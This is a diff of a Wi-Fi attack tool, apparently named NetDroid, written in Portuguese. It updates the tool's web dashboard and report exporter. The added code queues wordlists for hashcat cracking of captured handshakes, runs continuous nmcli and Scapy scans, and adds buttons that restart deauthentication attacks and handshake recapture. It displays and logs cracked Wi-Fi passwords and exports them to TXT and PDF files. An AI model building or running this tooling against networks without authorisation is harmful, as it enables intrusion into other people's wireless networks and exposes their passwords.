+  log(`Movido ${bssid} → ${destino}${perfil?` (perfil ${perfil})`:""}${wordlists.length>1?` [${wordlists.length} wordlists]`:""}`,
        destino==="vermelha"?"err":destino==="azul"?"info":"ok");
 }
 
@@ -6145,51 +7850,218 @@ async function abrirModalParaLote(bssids, origem){
   const wordlists = await (await fetch("/api/wordlists")).json();
   const sel = document.getElementById("modal-perfil");
   sel.innerHTML = Object.entries(perfis).map(([k,v])=>`<option value="${k}">${v.label}</option>`).join("");
-  const sw = document.getElementById("modal-wordlist");
-  sw.innerHTML = wordlists.length
-    ? wordlists.map(w=>`<option value="${w}">${w}</option>`).join("")
-    : "<option value=''>(nenhuma — coloque um .txt em ./WordList/)</option>";
+
+  // Popular lista de wordlists com checkboxes
+  const wlList = document.getElementById("modal-wordlist-list");
+  if(wordlists.length === 0){
+    wlList.innerHTML = "<div class='text-gray-500 italic p-2'>(nenhuma — coloque um .txt em ./WordList/)</div>";
+  } else {
+    wlList.innerHTML = wordlists.map(w=>{
+      const isSelected = selectedWordlists.includes(w);
+      const isContextual = w.startsWith("_contextual_");
+      return `
+        <label class="wordlist-checkbox ${isSelected?'wordlist-selected':''}" id="modal-wl-label-${w}">
+          <input type="checkbox" id="modal-wl-check-${w}" ${isSelected?'checked':''}
+                 onchange="toggleWordlistSelection('${w}', this.checked); this.parentElement.classList.toggle('wordlist-selected', this.checked);">
+          <span class="text-purple-300">📄 ${w}</span>
+          <span class="text-gray-500 text-xs ml-auto">${isContextual?"(contextual)":"base"}</span>
+        </label>
+      `;
+    }).join("");
+  }
+  renderWordlistQueue();
   document.getElementById("modal").classList.remove("hidden");
 }
 function fecharModal(){
   document.getElementById("modal").classList.add("hidden");
   modalContext = null;
 }
+
+// (versão completa de abrirDetalhes está mais abaixo, no bloco do modal-detalhes)
+
 function confirmarCrack(){
   if(!modalContext) return;
+  if(wordlistQueueOrder.length === 0){
+    alert("Selecione pelo menos uma wordlist!");
+    return;
+  }
   const perfil = document.getElementById("modal-perfil").value;
-  const wordlist = document.getElementById("modal-wordlist").value;
   const contextual = document.getElementById("modal-contextual").checked;
-  modalContext.bssids.forEach(bssid=>moverInterno(bssid, "azul", perfil, wordlist, contextual));
+  const stopOnCrack = document.getElementById("modal-stop-on-crack").checked;
+  const wordlists = [...wordlistQueueOrder]; // copia a ordem atual
+  modalContext.bssids.forEach(bssid=>moverInterno(bssid, "azul", perfil, wordlists, contextual, stopOnCrack));
   selecionados.clear();
+  selectedWordlists = [];
+  wordlistQueueOrder = [];
   renderZonas();
   fecharModal();
 }
 
+// ─── Cadeado: trava/destrava TODAS as varreduras ────────
+let cadeadoTravado = false;
+
+function toggleCadeado(){
+  cadeadoTravado = !cadeadoTravado;
+  const btn = document.getElementById("btn-cadeado");
+  if(cadeadoTravado){
+    btn.innerHTML = "🔒 Travado";
+    btn.classList.add("bg-yellow-700");
+    // Para tudo: scan contínuo + interval do frontend
+    if(mapeamentoContinuoAtivo){
+      mapeamentoContinuoAtivo = false;
+      if(mapeamentoIntervalId){ clearInterval(mapeamentoIntervalId); mapeamentoIntervalId = null; }
+      const bm = document.getElementById("btn-mapear");
+      if(bm){ bm.innerHTML = "🔄 Mapear Contínuo"; bm.classList.remove("blink","bg-yellow-600"); }
+      setLEDStatus("off");
+    }
+    try{ fetch("/api/rescan_stop", {method:"POST"}); }catch(e){}
+    log("🔒 Cadeado travado — varreduras pausadas", "warn");
+    toast("🔒 Cadeado travado — clique novamente para liberar");
+  } else {
+    btn.innerHTML = "🔓 Cadeado";
+    btn.classList.remove("bg-yellow-700");
+    log("🔓 Cadeado destravado — varreduras liberadas", "ok");
+    toast("🔓 Cadeado destravado");
+  }
+}
+function _cadeadoBloqueia(qual){
+  if(cadeadoTravado){
+    toast(`🔒 ${qual} bloqueado — destrave o cadeado primeiro`);
+    log(`🔒 ${qual} bloqueado pelo cadeado`, "warn");
+    return true;
+  }
+  return false;
+}
+
 // ─── Mapear redes (rescan + diff) ───────────────
-async function mapearRedes(){
+let mapeamentoContinuoAtivo = false;
+let mapeamentoIntervalId = null;
+
+async function toggleMapearContinuo(){
+  if(_cadeadoBloqueia("Mapear Contínuo")) return;
   const btn = document.getElementById("btn-mapear");
-  const original = btn.innerHTML;
-  btn.innerHTML = "🔄 Mapeando...";
+
+  if(mapeamentoContinuoAtivo){
+    // Parar scan contínuo
+    mapeamentoContinuoAtivo = false;
+    if(mapeamentoIntervalId){
+      clearInterval(mapeamentoIntervalId);
+      mapeamentoIntervalId = null;
+    }
+    btn.innerHTML = "🔄 Mapear Contínuo";
+    btn.classList.remove("blink");
+    btn.classList.remove("bg-yellow-600");
+    setLEDStatus("on");  // F6: LED verde (ocioso/online)
+    log("⏹ Scan contínuo parado", "warn");
+    // Notifica backend
+    try{ await fetch("/api/rescan_stop", {method:"POST"}); }catch(e){}
+  } else {
+    // Iniciar scan contínuo
+    mapeamentoContinuoAtivo = true;
+    btn.innerHTML = "⏹ Parar Scan";
+    btn.classList.add("blink");
+    btn.classList.add("bg-yellow-600");
+    setLEDStatus("warn");  // F6: LED amarelo (scan ativo)
+    log("▶ Scan contínuo iniciado...", "ok");
+    // Notifica backend para iniciar
+    try{
+      await fetch("/api/rescan_start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({profundo:false})});
+    }catch(e){}
+    // Executa imediatamente e agenda próximo
+    executarScanCiclo();
+    mapeamentoIntervalId = setInterval(executarScanCiclo, 5000); // A cada 5 segundos
+  }
+}
+
+async function executarScanCiclo(){
+  if(!mapeamentoContinuoAtivo) return;
+  try {
+    const r = await fetch("/api/rescan_exec", {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      log(`Erro no scan: ${data.erro}`, "err");
+    } else if(data.novos > 0) {
+      log(`🆕 ${data.novos} redes novas descobertas! Total: ${data.total}`, "ok");
+    }
+  } catch(e){
+    log(`Falha no scan cíclico: ${e.message}`, "err");
+  }
+}
+
+async function scanNmcli(){
+  if(_cadeadoBloqueia("NMCLI")) return;
+  const btn = document.getElementById("btn-nmcli");
+  const original = "📡 NMCLI";
+  if(btn){ btn.innerHTML = "📡 NMCLI..."; btn.disabled = true; }
+  try {
+    const r = await fetch("/api/scan_nmcli", {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      log(`NMCLI erro: ${data.erro}`, "err");
+      toast(`NMCLI erro: ${data.erro}`);
+    } else {
+      log(`📡 NMCLI: +${data.novos} novos | varridos ${data.varridos} | total ${data.total}`, "ok");
+      toast(`📡 NMCLI: +${data.novos} novos APs (total ${data.total})`);
+    }
+  } catch(e){
+    log(`NMCLI falhou: ${e.message}`, "err");
+  } finally {
+    if(btn){ btn.innerHTML = original; btn.disabled = false; }
+  }
+}
+
+async function scanScapy(){
+  if(_cadeadoBloqueia("Scapy")) return;
+  const btn = document.getElementById("btn-scapy");
+  const original = "🦂 Scapy";
+  if(btn){ btn.innerHTML = "🦂 Scapy..."; btn.disabled = true; }
+  try {
+    const r = await fetch("/api/scan_scapy", {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      log(`Scapy erro: ${data.erro}`, "err");
+      toast(`Scapy erro: ${data.erro}`);
+    } else {
+      log(`🦂 Scapy: +${data.novos} novos | varridos ${data.varridos} | total ${data.total}`, "ok");
+      toast(`🦂 Scapy: +${data.novos} novos APs (total ${data.total})`);
+    }
+  } catch(e){
+    log(`Scapy falhou: ${e.message}`, "err");
+  } finally {
+    if(btn){ btn.innerHTML = original; btn.disabled = false; }
+  }
+}
+
+async function mapearUmaVez(profundo = false){
+  const btn = document.getElementById("btn-mapear");
+  const original = "🔄 Mapear Contínuo";
+  btn.innerHTML = profundo ? "🔍 Scan Profundo..." : "🔄 Mapeando...";
   btn.disabled = true;
   try {
-    const r = await fetch("/api/rescan", {method:"POST"});
+    const r = await fetch("/api/rescan", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({profundo: profundo})
+    });
     const data = await r.json();
     if(data.erro){
       log(`Erro no remap: ${data.erro}`, "err");
     } else {
-      log(`✓ Remap concluído: ${data.novos} novas | ${data.atualizados||0} atualizadas | total ${data.total}`,"ok");
+      const modo = profundo ? "[PROFUNDO]" : "";
+      log(`${modo} ✓ Remap: ${data.novos} novas | ${data.atualizados||0} atualizadas | total ${data.total}`,"ok");
       if(data.novos > 0 && data.novos_essids){
-        toast(`🆕 ${data.novos} redes novas: ${data.novos_essids.slice(0,3).join(", ")}${data.novos_essids.length>3?"...":""}`);
+        toast(`${modo} 🆕 ${data.novos} redes: ${data.novos_essids.slice(0,3).join(", ")}${data.novos_essids.length>3?"...":""}`);
       } else {
-        toast("Nenhuma rede nova encontrada — todas já mapeadas.");
+        toast(`${modo} Nenhuma rede nova — todas já mapeadas.`);
       }
     }
   } catch(e){
     log(`Falha no remap: ${e.message}`, "err");
   } finally {
-    btn.innerHTML = original;
-    btn.disabled = false;
+    if(!mapeamentoContinuoAtivo){
+      btn.innerHTML = original;
+      btn.disabled = false;
+    }
   }
 }
 
@@ -6207,13 +8079,48 @@ function toast(msg){
   setTimeout(()=>{t.style.opacity="0"; t.style.transition="opacity .8s"; setTimeout(()=>t.remove(),900);},4000);
 }
 
+// F6: LED indicator no header (status do scanner)
+function setLEDStatus(estado){
+  const el = document.getElementById("led-status");
+  if(!el) return;
+  el.className = "led led-" + estado;  // on | warn | off
+}
+
+// F3: Exportar zona (PDF + TXT) para imports/
+async function exportarZona(zona){
+  const btn = event && event.currentTarget;
+  const original = btn ? btn.innerHTML : null;
+  if(btn){ btn.innerHTML = "⏳ exportando..."; btn.disabled = true; }
+  try {
+    const r = await fetch(`/api/exportar?zona=${encodeURIComponent(zona)}`, {method:"POST"});
+    const data = await r.json();
+    if(data.erro){
+      toast(`❌ Erro ao exportar: ${data.erro}`);
+      log(`Falha export ${zona}: ${data.erro}`, "err");
+      return;
+    }
+    if(data.count === 0){
+      toast(`⚠ Zona ${zona} está vazia — nada para exportar`);
+      return;
+    }
+    const arquivos = (data.paths||[]).map(p=>p.split(/[\\/]/).pop()).join(", ");
+    toast(`✓ ${data.count} APs da zona ${zona} exportados em imports/`);
+    log(`📤 Export ${zona}: ${data.count} APs → ${arquivos}`, "ok");
+  } catch(e){
+    toast(`❌ Falha export: ${e.message}`);
+    log(`Falha export ${zona}: ${e.message}`, "err");
+  } finally {
+    if(btn && original){ btn.innerHTML = original; btn.disabled = false; }
+  }
+}
+
 // ─── Modal de DETALHES PROFUNDOS ────────────────
 async function abrirDetalhes(bssid){
   try {
     const r = await fetch("/api/ap/" + encodeURIComponent(bssid));
     const ap = await r.json();
     document.getElementById("det-essid").textContent = ap.essid || "<oculto>";
-    document.getElementById("det-bssid").textContent = ap.bssid + " · ch " + (ap.canal||"?") + " · " + (ap.rssi||"?") + "dBm";
+    document.getElementById("det-bssid").textContent = ap.bssid + " · ch " + (ap.canal||"?") + " · " + freqResumo(ap) + " · " + sinalResumo(ap);
 
     const linhas = [];
     // Identidade
@@ -6223,8 +8130,10 @@ async function abrirDetalhes(bssid){
         <div><span class="text-gray-400">ESSID:</span> <span class="text-white font-bold">${ap.essid||"<oculto>"}</span></div>
         <div><span class="text-gray-400">BSSID:</span> <code class="text-cyan-400">${ap.bssid||"?"}</code></div>
         <div><span class="text-gray-400">Canal:</span> <span class="text-white">${ap.canal||"?"}</span></div>
-        <div><span class="text-gray-400">RSSI:</span> <span class="text-yellow-400">${ap.rssi||"?"} dBm</span></div>
-        <div><span class="text-gray-400">Criptografia:</span> <span class="text-orange-400">${ap.crypto||"?"}</span></div>
+        <div><span class="text-gray-400">Frequência:</span> <span class="text-white">${freqResumo(ap)}</span></div>
+        <div><span class="text-gray-400">Sinal:</span> <span class="text-yellow-400">${sinalResumo(ap)}</span></div>
+        <div><span class="text-gray-400">Criptografia:</span> <span class="text-orange-400">${ap.security||ap.crypto||"?"}</span></div>
+        <div><span class="text-gray-400">Fonte:</span> <span class="text-white">${ap.source||"?"}</span></div>
         <div><span class="text-gray-400">WPS:</span> ${ap.wps_enabled?'<span class="text-red-400 font-bold">ATIVO ⚠</span>':'<span class="text-green-400">desativado</span>'}</div>
       </div>
     </div>`);
@@ -6283,9 +8192,12 @@ async function abrirDetalhes(bssid){
       linhas.push(`<div class="cyber rounded p-3 zone-blue">
         <h4 class="text-xs font-bold text-cyan-300 mb-2 uppercase tracking-wider">⚙ Crack em Andamento</h4>
         <div class="text-xs space-y-1">
-          <div>Status: <span class="text-cyan-400 font-bold">${ap.crack.status}</span> · ${(ap.crack.progresso||0).toFixed(1)}%</div>
+          <div>Status: <span class="text-cyan-400 font-bold">${statusCrackLabel(ap.crack.status)}</span> · ${(ap.crack.progresso||0).toFixed(1)}%</div>
           <div class="bg-gray-900 h-2 rounded overflow-hidden mt-1"><div class="progress-bar" style="width:${ap.crack.progresso||0}%"></div></div>
+          ${ap.crack.wordlist_atual?`<div>Wordlist atual: <span class="text-purple-400">${(ap.crack.wordlist_index||0)+1}/${ap.crack.wordlist_total||1} · ${ap.crack.wordlist_atual}</span></div>`:""}
+          ${ap.crack.wordlist_progress?`<div>Progresso da wordlist: <span class="text-purple-400">${ap.crack.wordlist_progress.toFixed(1)}%</span></div>`:""}
           ${ap.crack.eta?`<div>ETA: <span class="text-purple-400">${ap.crack.eta}</span></div>`:""}
+          ${ap.crack.erro?`<div class="text-red-400">${ap.crack.erro}</div>`:""}
           ${ap.crack.contextual_count?`<div>Variações contextuais: <span class="text-purple-400">${ap.crack.contextual_count}</span></div>`:""}
         </div>
       </div>`);
@@ -6318,28 +8230,116 @@ async function carregarWordlists(){
   if(!ws || ws.length === 0){
     el.innerHTML = `<div class="text-gray-500 italic">Nenhuma wordlist em ./WordList/. Adicione arquivos .txt.</div>`;
   } else {
-    el.innerHTML = ws.map(w=>`
-      <div class="flex items-center justify-between p-2 hover:bg-purple-950/30 rounded">
+    el.innerHTML = ws.map(w=>{
+      const isSelected = selectedWordlists.includes(w);
+      const isContextual = w.startsWith("_contextual_");
+      return `
+      <label class="wordlist-checkbox ${isSelected?'wordlist-selected':''}" id="wl-label-${w}">
+        <input type="checkbox" id="wl-check-${w}" ${isSelected?'checked':''}
+               onchange="toggleWordlistSelection('${w}', this.checked); this.parentElement.classList.toggle('wordlist-selected', this.checked);">
         <span class="text-purple-300">📄 ${w}</span>
-        <span class="text-gray-500 text-xs">${w.startsWith("_contextual_")?"(contextual)":"base"}</span>
+        <span class="text-gray-500 text-xs ml-auto">${isContextual?"(contextual)":"base"}</span>
+      </label>
+    `}).join("");
+  }
+}
+
+// ─── Funções de Reset ───────────────────────────
+function resetDeauth(bssid){
+  if(!confirm(`Reiniciar deauth para ${aps[bssid]?.essid || bssid}?`)) return;
+  sock.emit("reset_deauth", {bssid});
+  log(`↻ Reiniciando deauth para ${bssid}`, "warn");
+}
+function resetCrack(bssid, recapturar){
+  const acao = recapturar ? "recapturar handshake e reiniciar crack" : "reiniciar apenas crack";
+  if(!confirm(`${acao} para ${aps[bssid]?.essid || bssid}?`)) return;
+  sock.emit("reset_crack", {bssid, recapturar});
+  log(`↻ ${acao} para ${bssid}`, "warn");
+}
+function recapturarHandshake(bssid){
+  if(!confirm(`Cancelar captura atual e recapturar handshake do zero para ${aps[bssid]?.essid || bssid}?`)) return;
+  sock.emit("recapturar_handshake", {bssid});
+  log(`🔄 Recaptura solicitada para ${bssid}`, "warn");
+  toast(`🔄 Recapturando ${aps[bssid]?.essid || bssid}…`);
+}
+
+// ─── Múltiplas Wordlists ────────────────────────
+let selectedWordlists = [];
+let wordlistQueueOrder = [];
+
+function toggleWordlistSelection(filename, checked){
+  if(checked){
+    if(!selectedWordlists.includes(filename)){
+      selectedWordlists.push(filename);
+      wordlistQueueOrder.push(filename);
+    }
+  } else {
+    selectedWordlists = selectedWordlists.filter(w => w !== filename);
+    wordlistQueueOrder = wordlistQueueOrder.filter(w => w !== filename);
+  }
+  renderWordlistQueue();
+}
+function removeFromQueue(filename){
+  selectedWordlists = selectedWordlists.filter(w => w !== filename);
+  wordlistQueueOrder = wordlistQueueOrder.filter(w => w !== filename);
+  renderWordlistQueue();
+  // Uncheck the checkbox
+  const cb = document.getElementById(`wl-check-${filename}`);
+  if(cb) cb.checked = false;
+  const modalCb = document.getElementById(`modal-wl-check-${filename}`);
+  if(modalCb) modalCb.checked = false;
+}
+function renderWordlistQueue(){
+  const el = document.getElementById("wordlist-queue");
+  if(!el) return;
+  if(wordlistQueueOrder.length === 0){
+    el.innerHTML = '<span class="text-gray-500 text-xs italic">Nenhuma wordlist selecionada</span>';
+  } else {
+    el.innerHTML = wordlistQueueOrder.map((w, i) => `
+      <div class="wordlist-queue-item">
+        <span>${i+1}. ${w}</span>
+        <span class="remove" onclick="removeFromQueue('${w}')">×</span>
       </div>
     `).join("");
   }
+}
+function clearWordlistSelection(){
+  selectedWordlists = [];
+  wordlistQueueOrder = [];
+  renderWordlistQueue();
+  document.querySelectorAll('.wordlist-checkbox input').forEach(cb => cb.checked = false);
 }
 
 function log(msg, tipo){
   const el = document.getElementById("logfeed");
   const cor = {info:"text-cyan-400",ok:"text-green-400",warn:"text-yellow-400",err:"text-red-400"}[tipo]||"text-gray-400";
   const t = new Date().toLocaleTimeString();
-  el.innerHTML = `<span class="${cor}">[${t}] ${msg}</span>\n` + el.innerHTML;
+  let novo = `<span class="${cor}">[${t}] ${msg}</span>\n` + el.innerHTML;
+  // B8: cap em 50KB (~300 linhas) para evitar memory leak em sessões longas
+  if(novo.length > 50000) novo = novo.slice(0, 50000);
+  el.innerHTML = novo;
 }
 
 setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);
 setInterval(carregarWordlists, 10000);
 
 let lastTotal=0, lastT=Date.now();
+// B6: garante que ap.crack reflete senha vinda da memória (sessões anteriores)
+function _hidrarCrackDeMemoria(ap){
+  if(!ap) return ap;
+  if(ap.senha && (!ap.crack || !ap.crack.senha)){
+    ap.crack = ap.crack || {};
+    ap.crack.status = "cracked";
+    ap.crack.senha = ap.senha;
+    ap.crack.progresso = 100;
+    ap.crack.wordlist_quebrou = ap.wordlist_usada || "";
+    ap.crack.eta = "—";
+  }
+  return ap;
+}
+
 sock.on("estado_inicial",s=>{
-  (s.aps||[]).forEach(a=>aps[a.bssid]=a);
+  (s.aps||[]).forEach(a=>{ aps[a.bssid]=_hidrarCrackDeMemoria(a); });
   if(s.zonas){zonas={...zonas,...s.zonas}}
   document.getElementById("stat-pkts").textContent = (s.pacotes_total||0).toLocaleString();
   renderZonas(); bindSortable(); carregarWordlists(); atualizarStatsMemoria();
@@ -6349,7 +8349,7 @@ sock.on("rescan_done",d=>{
   atualizarStatsMemoria();
 });
 sock.on("ap_descoberto",a=>{
-  aps[a.bssid]=a;
+  aps[a.bssid]=_hidrarCrackDeMemoria(a);
   if(!Object.values(zonas).flat().includes(a.bssid)) zonas.verde.push(a.bssid);
   renderZonas();
   log(`AP descoberto: ${a.essid||"?"} (${a.bssid}) ${a.crypto||""}`,"ok");
@@ -6366,13 +8366,243 @@ sock.on("pacotes_total",p=>{
 sock.on("hashcat_start",d=>{aps[d.item.bssid]=aps[d.item.bssid]||{};aps[d.item.bssid].crack=d.item;renderZonas();log(`▶ Crack iniciado em ${d.item.bssid} (${d.item.contextual_count||0} variações contextuais)`,"info");});
 sock.on("hashcat_progress",d=>{if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;renderZonas();}});
 sock.on("hashcat_done",d=>{
-  if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;renderZonas();}
-  if(d.item.status==="cracked") log(`🔓 SENHA QUEBRADA ${d.item.bssid}: ${d.item.senha}`,"ok");
-  else log(`❌ Crack falhou ${d.item.bssid}: ${d.item.erro||d.item.status}`,"err");
+  if(aps[d.item.bssid]){aps[d.item.bssid].crack=d.item;}
+  if(d.item.status==="cracked") {
+    // F4: dispara animação morph-to-green + glow-victory por 4s
+    zonasRecemCracked.add(d.item.bssid);
+    // Atualiza ap.senha para sobreviver entre re-renderizações
+    if(aps[d.item.bssid]) {
+      aps[d.item.bssid].senha = d.item.senha;
+      aps[d.item.bssid].wordlist_usada = d.item.wordlist_quebrou || d.item.wordlist_efetiva || "";
+      aps[d.item.bssid].quebrada_em = d.item.finished_at || new Date().toISOString();
+    }
+    renderZonas();
+    setTimeout(()=>{
+      zonasRecemCracked.delete(d.item.bssid);
+      renderZonas();
+    }, 4200);
+    log(`🔓 SENHA QUEBRADA ${d.item.bssid}: ${d.item.senha}`,"ok");
+    atualizarStatsMemoria();
+  } else {
+    renderZonas();
+    log(`❌ Crack falhou ${d.item.bssid}: ${d.item.erro||d.item.status}`,"err");
+  }
+});
+// B9: listeners órfãos removidos (host_found, host_update, vuln_found, fase
+// não são emitidos pelo backend KAMIKASE — eram resíduo do template GOD)
+sock.on("monitor_failed",d=>{
+  if(aps[d.bssid]){aps[d.bssid].monitor_failed=true; aps[d.bssid].monitor_aviso=d.motivo;}
+  log(`⚠ Monitor mode ausente para ${d.bssid}: ${d.motivo||""}`,"warn");
+  renderZonas();
 });
 sock.on("log",d=>log(d.msg,d.tipo||"info"));
 </script>
 </body></html>"""
+
+
+# ══════════════════ ZONA EXPORTER (--live --kamikase) ══════════
+# Gera arquivos TXT + PDF em ./imports/ com snapshot de uma zona
+# (verde, vermelha, azul ou todas) do dashboard.
+
+class ZonaExporter:
+    """Exporta lista de APs de uma zona para TXT + PDF.
+    TXT: legível em qualquer editor. PDF: relatório formal cyberpunk."""
+
+    def __init__(self, ui: "TerminalUI"):
+        self.ui = ui
+
+    def exportar(self, zona_label: str, aps: List[Dict[str, Any]]) -> Dict[str, Any]:
+        """Gera os 2 arquivos. Retorna {ok, paths, count}.
+        zona_label: 'verde'|'vermelha'|'azul'|'todas'."""
+        IMPORTS_DIR.mkdir(parents=True, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        base = IMPORTS_DIR / f"zona_{zona_label}_{ts}"
+        path_txt = base.with_suffix(".txt")
+        path_pdf = base.with_suffix(".pdf")
+        gerados: List[str] = []
+
+        # TXT sempre é gerado (é leve e não depende de lib externa)
+        try:
+            self._gerar_txt(zona_label, aps, path_txt)
+            gerados.append(str(path_txt))
+        except Exception as e:
+            self.ui.error(f"Falha ao gerar TXT: {e}")
+
+        # PDF só se reportlab disponível
+        if HAS_REPORTLAB:
+            try:
+                self._gerar_pdf(zona_label, aps, path_pdf)
+                gerados.append(str(path_pdf))
+            except Exception as e:
+                self.ui.error(f"Falha ao gerar PDF: {e}")
+        else:
+            self.ui.warn("reportlab não disponível — PDF não gerado.")
+
+        return {"ok": bool(gerados), "paths": gerados, "count": len(aps),
+                "zona": zona_label}
+
+    def _gerar_txt(self, zona_label: str, aps: List[Dict[str, Any]], path: Path):
+        linhas: List[str] = []
+        sep = "=" * 72
+        linhas.append(sep)
+        linhas.append(f"  NetDroid v{VERSION} — Export Zona {zona_label.upper()}")
+        linhas.append(f"  Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
+        linhas.append(f"  Total de APs: {len(aps)}")
+        linhas.append(sep)
+        linhas.append("")
+
+        for i, ap in enumerate(aps, 1):
+            linhas.append(f"[{i:03d}] {ap.get('essid', '?')}")
+            linhas.append(f"     BSSID:        {ap.get('bssid', '?')}")
+            linhas.append(f"     Canal:        {ap.get('canal', '?')} ({ap.get('band_label', '?')})")
+            linhas.append(f"     Frequência:   {ap.get('freq_mhz', '?')} MHz")
+            linhas.append(f"     Sinal:        {ap.get('rssi_dbm', '?')} dBm "
+                          f"({ap.get('signal_label', '?')})")
+            linhas.append(f"     Segurança:    {ap.get('security', ap.get('crypto', '?'))}")
+            linhas.append(f"     WPS:          {'ATIVO ⚠' if ap.get('wps_enabled') else 'desativado'}")
+            linhas.append(f"     Score:        {ap.get('score', '?')}/100  ({ap.get('severidade_maior', 'ok')})")
+            linhas.append(f"     Fonte scan:   {ap.get('source', '?')}")
+
+            if ap.get("achados"):
+                linhas.append(f"     Achados ({len(ap['achados'])}):")
+                for a in ap["achados"]:
+                    linhas.append(f"       - [{a.get('severidade', '?').upper()}] {a.get('descricao', '?')}")
+
+            if ap.get("primeiro_visto"):
+                linhas.append(f"     Primeiro visto: {ap['primeiro_visto']}")
+            if ap.get("ultima_vez"):
+                linhas.append(f"     Última vez:     {ap['ultima_vez']}")
+            if ap.get("visitas"):
+                linhas.append(f"     Visitas:        {ap['visitas']}")
+            if ap.get("pacotes"):
+                linhas.append(f"     Deauth pkts:    {ap['pacotes']}")
+            if ap.get("handshake_path"):
+                linhas.append(f"     Handshake:      {ap['handshake_path']}")
+            if ap.get("senha"):
+                linhas.append(f"     🔓 SENHA:       {ap['senha']}")
+                if ap.get("wordlist_usada"):
+                    linhas.append(f"        via wordlist: {ap['wordlist_usada']}")
+                if ap.get("quebrada_em"):
+                    linhas.append(f"        quebrada em:  {ap['quebrada_em']}")
+
+            crack = ap.get("crack") or {}
+            if crack.get("status") and crack["status"] not in ("queued",):
+                linhas.append(f"     Crack:        {crack.get('status', '?')} "
+                              f"({crack.get('progresso', 0)}%)")
+                if crack.get("eta"):
+                    linhas.append(f"        ETA:          {crack['eta']}")
+
+            linhas.append("")  # separa APs
+
+        linhas.append(sep)
+        linhas.append(f"  Fim do export · NetDroid v{VERSION} · uso autorizado apenas")
+        linhas.append(sep)
+
+        path.write_text("\n".join(linhas), encoding="utf-8")
+        self.ui.success(f"TXT exportado: {path}")
+
+    def _gerar_pdf(self, zona_label: str, aps: List[Dict[str, Any]], path: Path):
+        zona_cores = {
+            "verde":    rl_colors.HexColor("#00ff9f"),
+            "vermelha": rl_colors.HexColor("#ff003c"),
+            "azul":     rl_colors.HexColor("#00d4ff"),
+            "todas":    rl_colors.HexColor("#bc13fe"),
+        }
+        cor_zona = zona_cores.get(zona_label, rl_colors.HexColor("#cc0000"))
+
+        doc = SimpleDocTemplate(str(path), pagesize=A4,
+                                 leftMargin=1.5*cm, rightMargin=1.5*cm,
+                                 topMargin=1.5*cm, bottomMargin=1.5*cm)
+        styles = getSampleStyleSheet()
+        h1 = ParagraphStyle("H1", parent=styles["Heading1"],
+                             textColor=cor_zona, fontSize=20, spaceAfter=8,
+                             fontName="Helvetica-Bold")
+        h2 = ParagraphStyle("H2", parent=styles["Heading2"],
+                             textColor=cor_zona, fontSize=12, spaceBefore=10,
+                             spaceAfter=4, fontName="Helvetica-Bold")
+        body = ParagraphStyle("Body", parent=styles["BodyText"],
+                               fontSize=8.5, leading=11, fontName="Helvetica")
+        meta = ParagraphStyle("Meta", parent=styles["BodyText"],
+                               fontSize=7.5, leading=10, fontName="Helvetica",
+                               textColor=rl_colors.HexColor("#555"))
+
+        elementos: List[Any] = []
+        elementos.append(Paragraph(f"NetDroid v{VERSION} — Zona {zona_label.upper()}", h1))
+        elementos.append(Paragraph(
+            f"Gerado em: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')} · "
+            f"Total: <b>{len(aps)}</b> APs",
+            meta))
+        elementos.append(Spacer(1, 12))
+
+        # Tabela resumo
+        elementos.append(Paragraph("Resumo (todos os APs)", h2))
+        tabela = [["#", "ESSID", "BSSID", "Canal", "RSSI", "Sec", "Score", "Senha"]]
+        for i, ap in enumerate(aps, 1):
+            tabela.append([
+                str(i),
+                str(ap.get("essid", "?"))[:20],
+                str(ap.get("bssid", "?")),
+                str(ap.get("canal", "?")),
+                str(ap.get("rssi_dbm", "?")),
+                str(ap.get("security", "?"))[:10],
+                str(ap.get("score", "?")),
+                "🔓 " + str(ap["senha"])[:18] if ap.get("senha") else "—",
+            ])
+        t = RLTable(tabela, repeatRows=1,
+                     colWidths=[0.8*cm, 4*cm, 3.5*cm, 1.3*cm,
+                                1.5*cm, 1.5*cm, 1.3*cm, 4*cm])
+        t.setStyle(TableStyle([
+            ("BACKGROUND", (0, 0), (-1, 0), rl_colors.HexColor("#1a0000")),
+            ("TEXTCOLOR", (0, 0), (-1, 0), cor_zona),
+            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
+            ("FONTSIZE", (0, 0), (-1, -1), 7.5),
+            ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
+            ("GRID", (0, 0), (-1, -1), 0.25, rl_colors.HexColor("#444")),
+            ("ROWBACKGROUNDS", (0, 1), (-1, -1),
+                [rl_colors.HexColor("#0a0a0a"), rl_colors.HexColor("#111")]),
+            ("TEXTCOLOR", (0, 1), (-1, -1), rl_colors.HexColor("#e8eaed")),
+        ]))
+        elementos.append(t)
+
+        # Detalhes por AP (página nova se >5)
+        if len(aps) > 0:
+            elementos.append(PageBreak())
+            elementos.append(Paragraph("Detalhamento por AP", h1))
+            for i, ap in enumerate(aps, 1):
+                elementos.append(Paragraph(
+                    f"<b>{i}. {ap.get('essid', '?')}</b>", h2))
+                lines = [
+                    f"<b>BSSID:</b> {ap.get('bssid', '?')}",
+                    f"<b>Canal:</b> {ap.get('canal', '?')} ({ap.get('band_label', '?')}) · "
+                    f"<b>Sinal:</b> {ap.get('rssi_dbm', '?')} dBm",
+                    f"<b>Segurança:</b> {ap.get('security', '?')} · "
+                    f"<b>WPS:</b> {'ATIVO' if ap.get('wps_enabled') else 'desativado'}",
+                    f"<b>Score:</b> {ap.get('score', '?')}/100 · "
+                    f"<b>Fonte:</b> {ap.get('source', '?')}",
+                ]
+                if ap.get("achados"):
+                    achados_str = "; ".join(
+                        f"[{a.get('severidade', '?').upper()}] {a.get('descricao', '?')}"
+                        for a in ap["achados"]
+                    )
+                    lines.append(f"<b>Achados:</b> {achados_str}")
+                if ap.get("senha"):
+                    lines.append(
+                        f"<b>🔓 SENHA:</b> <font color='#00aa44'>{ap['senha']}</font>")
+                    if ap.get("wordlist_usada"):
